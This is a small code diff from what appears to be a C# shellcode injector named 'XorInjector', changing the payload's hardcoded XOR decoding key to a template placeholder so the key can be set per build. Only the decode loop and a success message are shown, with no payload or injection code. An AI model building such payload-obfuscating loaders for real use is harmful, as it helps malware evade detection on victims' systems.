@@ -28,7 +28,7 @@ namespace XorInjector
             // Decode the XOR payload (key: 0xfa)
             for (int i = 0; i < buf.Length; i++)
             {
-                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
+                buf[i] = (byte)((uint)buf[i] ^ 0x{{ xor_key }});
             }
 
             Console.WriteLine("[+] Payload decoded successfully");
